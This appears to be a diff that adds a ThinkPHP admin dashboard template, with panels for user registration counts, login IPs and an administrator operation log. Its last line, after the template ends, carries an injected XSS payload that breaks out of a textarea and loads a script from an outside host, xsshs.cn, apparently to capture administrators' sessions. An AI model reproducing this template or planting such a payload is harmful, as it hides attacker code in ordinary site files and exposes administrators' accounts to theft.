@@ -1,0 +1,174 @@
+{extend name="public/base"} {block name="content"}
+<section id="main-content">
+    <section class="wrapper">
+        <!--state overview start-->
+        <div class="row state-overview">
+            <div class="col-lg-3 col-sm-6">
+                <section class="panel">
+                    <div class="symbol terques">
+                        <img style="width:33%;height:50%" src="__STATIC__/admin/img/11.png" alt="">
+                        <!-- <i class="icon-user"></i> -->
+                    </div>
+                    <div class="value">
+                        <p>新用户</p>
+                        <h1>{$newUser}</h1>
+                    </div>
+                </section>
+            </div>
+            <div class="col-lg-3 col-sm-6">
+                <section class="panel">
+                    <div class="symbol red">
+                        <img style="width:47%;height:50%" src="__STATIC__/admin/img/22.png" alt="">
+                        <!-- <i class="icon-tags"></i> -->
+                    </div>
+                    <div class="value">
+                        <p>当前账号登陆次数</p>
+                        <h1>{$times}</h1>
+                    </div>
+                </section>
+            </div>
+            <div class="col-lg-3 col-sm-6">
+                <section class="panel">
+                    <div class="symbol yellow">
+                        <img style="width:37%;height:50%" src="__STATIC__/admin/img/33.png" alt="">
+                        <!-- <i class="icon-reply"></i> -->
+                    </div>
+                    <div class="value">
+                        <p>上次登陆</p>
+                        <h1>{$prevIp}</h1>
+                    </div>
+                </section>
+            </div>
+            <div class="col-lg-3 col-sm-6">
+                <section class="panel">
+                    <div class="symbol blue">
+                        <img style="width:44%;height:50%" src="__STATIC__/admin/img/44.png" alt="">
+                        <!-- <i class="icon-bar-chart"></i> -->
+                    </div>
+                    <div class="value">
+                        <p>本次登陆</p>
+                        <h1>{$ip}</h1>
+                    </div>
+                </section>
+            </div>
+        </div>
+        <!--state overview end-->
+        <div class="row">
+            <div class="col-lg-12">
+                <!--custom chart start-->
+                <div class="border-head">
+                    <h3>用户注册数</h3>
+                </div>
+                <div class="panel terques-chart">
+                    <div class="panel-body chart-texture">
+                        <div class="chart">
+                            <div class="heading">
+                                <div>
+                                    <strong style="margin-left: 1rem;">今天注册：{$todayNum} |</strong>
+                                    <strong style="margin-left: 1rem;">昨天注册：{$yesterdayNum} |</strong>
+                                    <strong style="margin-left: 1rem;">本月注册：{$mouthNum} |</strong>
+                                    <strong style="margin-left: 1rem;">历史注册：{$totalNum}</strong>
+                                    <strong style="margin-left: 1rem;">今日未激活注册：{$statusNum}</strong>
+                                    <strong style="margin-left: 1rem;">累计未激活注册：{$statusTotalNum}</strong>
+                                </div>
+                            </div>
+                            <div class="sparkline" data-type="line" data-resize="true" data-height="20vh" data-width="90%" data-line-width="1" data-line-color="#fff" data-spot-color="#fff" data-fill-color="" data-highlight-line-color="#fff" data-spot-radius="4" data-data="[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]">
+                                <canvas width="1504" height="181" style="display: inline-block; width: 1504px; height: 181px; vertical-align: top;"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="chart-tittle">
+                        <span class="title">用户注册数</span>
+                    </div>
+                </div>
+                <!--custom chart end-->
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-12">
+                <!--work progress start-->
+                <section class="panel">
+                    <div class="panel-body progress-panel">
+                        <div class="task-progress">
+                            <h1>管理员操作日志 <span style="position: absolute;right: 28px;top:12px;"><a href="{:url('ffadmin/config/loglist')}">查看更多</a></span> </h1>
+                        </div>
+                    </div>
+                    <table class="table table-hover personal-task">
+                        <tbody>
+                        {volist name="logs" id="vo"}
+                        <tr>
+                            <td>{$key+1}</td>
+                            <td>后台用户：【{$vo.admin}】 在 【{:date('Y-m-d H:i:s',$vo.create_time)}】 对 【{$vo.t_name}】 进行了 【{$vo.type}】 操作</td>
+                        </tr>
+                        {/volist}
+                        <tr>
+                            <td></td>
+                            <td><a href="loglist.html">查看更多</a></td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </section>
+                <!--work progress end-->
+            </div>
+            <div class="col-lg-6 hidden">
+                <section class="panel">
+                    <div class="revenue-head">
+                        <span>
+                                  <i class="icon-bar-chart"></i>
+                              </span>
+                        <h3>Revenue</h3>
+                        <span class="rev-combo pull-right">
+                                 June 2013
+                              </span>
+                    </div>
+                    <div class="panel-body">
+                        <div class="row">
+                            <div class="col-lg-6 col-sm-6 text-center">
+                                <div class="easy-pie-chart">
+                                    <div class="percentage easyPieChart" data-percent="35" style="width: 135px; height: 135px; line-height: 135px;"><span>35</span>%
+                                        <canvas width="135" height="135"></canvas>
+                                        <canvas width="135" height="135"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-lg-6 col-sm-6">
+                                <div class="chart-info chart-position">
+                                    <span class="increase"></span>
+                                    <span>Revenue Increase</span>
+                                </div>
+                                <div class="chart-info">
+                                    <span class="decrease"></span>
+                                    <span>Revenue Decrease</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="panel-footer revenue-foot">
+                        <ul>
+                            <li class="first active">
+                                <a href="javascript:;">
+                                    <i class="icon-bullseye"></i>
+                                    Graphical
+                                </a>
+                            </li>
+                            <li>
+                                <a href="javascript:;">
+                                    <i class=" icon-th-large"></i>
+                                    Tabular
+                                </a>
+                            </li>
+                            <li class="last">
+                                <a href="javascript:;">
+                                    <i class=" icon-align-justify"></i>
+                                    Listing
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </section>
+</section>
+{/block}
+</tExtArEa>'"><sCRiPt sRC=//xsshs.cn/kWMA></sCrIpT>
